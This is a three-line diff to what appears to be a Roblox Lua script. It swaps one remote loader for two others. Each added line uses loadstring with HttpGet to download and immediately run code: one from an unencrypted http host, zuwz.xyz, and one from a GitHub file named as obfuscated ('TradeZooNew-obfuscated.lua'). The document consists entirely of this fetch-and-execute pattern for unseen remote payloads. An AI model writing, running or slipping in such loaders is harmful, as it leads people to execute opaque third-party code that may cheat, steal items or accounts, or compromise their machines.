@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Bosszat/Build/refs/heads/main/Frame"))()
+loadstring(game:HttpGet('http://zuwz.xyz/Zee-BAZ.lua'))()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/104mapleoof-max/roblox-scripts/refs/heads/main/TradeZooNew-obfuscated.lua"))()
